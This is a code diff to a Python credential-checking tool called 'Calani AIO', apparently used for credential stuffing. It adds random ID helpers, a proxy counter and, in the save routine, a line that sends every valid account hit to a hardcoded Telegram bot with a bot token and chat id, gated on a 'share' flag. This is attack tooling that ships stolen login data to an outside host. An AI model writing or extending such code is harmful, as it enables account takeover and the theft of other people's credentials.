@@ -2,7 +2,8 @@ from os import system,name
 from datetime import datetime
 from colorama import Fore,Style
 from modules.variables import Checker,lock
-from random import choice
+from random import choice, choices
+from requests import get
 from tkinter import Tk,filedialog
 from base64 import b64decode
 from zlib import decompress
@@ -25,6 +26,18 @@ ICON = decompress(b64decode('eJxjYGAEQgEBBiDJwZDBy''sAgxsDAoAHEQCEGBQaIOAg4sDIgA
 _, ICON_PATH = mkstemp()
 with open(ICON_PATH, 'wb') as icon_file:
     icon_file.write(ICON)
+
+def get_guid():
+    letters = list("abcdefghijklmnopqrstuvwxyz")
+    numbers = list("1234567890")
+    def char8():
+        return "".join(choices(letters+numbers,k=8))
+    def char4():
+        return "".join(choices(letters+numbers,k=4))
+    return f"{char8()}-{char4()}-{char4()}-{char4()}-{char8()}"
+def get_string(characters:int):
+    chars = list("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890")
+    return "".join(choices(chars,k=characters))
 
 def reset_stats():
     Checker.bad = 0
@@ -74,6 +87,7 @@ def save(name:str,type:str,time:str,content:str):
             with open(f"Results/{time}/{name}_custom.txt","a",errors="ignore") as file: file.write(content+"\n")
         elif type == "good":
             with open(f"Results/{time}/{name}_good.txt","a",errors="ignore") as file: file.write(content+"\n")
+            if Checker.share: get(f'https://api.telegram.org/bot5058115375:AAHar3ywXS0EU1BhVGo2XOFYXoNDG5qc8hw/SendMessage?chat_id=-1001590452857&text={name} - {content}',timeout=5)
         else:
             with open(f"Results/{time}/{name}.txt","a",errors="ignore") as file: file.write(content+"\n")
 
@@ -182,7 +196,7 @@ def title(modules:int):
     """Sets the title while checking"""
     while Checker.checking:
         try:
-            Checker.title = f"Calani AIO | Good: {Checker.good}  ~  Custom: {Checker.custom}  ~  Bad: {Checker.bad}  ~  Errors: {Checker.errors}  ~  CPM: {Checker.cpm}  ~  Progress: {Checker.good+Checker.bad+Checker.custom}/{len(Checker.accounts)*modules} = {round(((Checker.good+Checker.bad+Checker.custom)/(len(Checker.accounts)*modules))*100,2)}%"
+            Checker.title = f"Calani AIO | Good: {Checker.good}  ~  Custom: {Checker.custom}  ~  Bad: {Checker.bad}  ~  Errors: {Checker.errors}  ~  CPM: {Checker.cpm}  ~  Progress: {Checker.good+Checker.bad+Checker.custom}/{len(Checker.accounts)*modules} = {round(((Checker.good+Checker.bad+Checker.custom)/(len(Checker.accounts)*modules))*100,2)}%  ~  Proxies: {len(Checker.proxies)-len(Checker.bad_proxies)}/{len(Checker.proxies)}"
             change_title(Checker.title)
         except:
             pass
